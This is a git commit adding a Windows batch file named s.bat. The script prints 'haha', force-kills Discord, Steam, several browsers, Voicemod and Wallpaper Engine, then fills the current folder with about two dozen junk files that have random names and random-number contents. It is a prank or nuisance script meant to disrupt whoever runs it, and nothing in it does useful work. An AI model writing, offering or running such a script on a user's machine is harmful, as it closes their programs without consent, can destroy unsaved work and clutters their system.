81b3fc77f4d59632d9a01ec6ce4e222878db9a98
AgentUNO1 <162668739+AgentUNO1@users.noreply.github.com>
2024-03-21 19:10:09 -0500

    Add files via upload

---
+++ s.bat
@@ -0,0 +1,312 @@
+@echo off
+
+echo haha
+taskkill /IM discord.exe /F
+taskkill /IM steam.exe /F
+taskkill /IM firefox.exe /F
+taskkill /IM brave.exe /F
+taskkill /IM msedge.exe /F
+taskkill /IM voicemod.exe /F
+taskkill /IM wallpaper32.exe /F
+taskkill /IM wallpaper64.exe /F
+timeout /t 1 /nobreak
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+
+(
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+echo %RANDOM%
+)>%RANDOM%.%RANDOM%
+EXIT
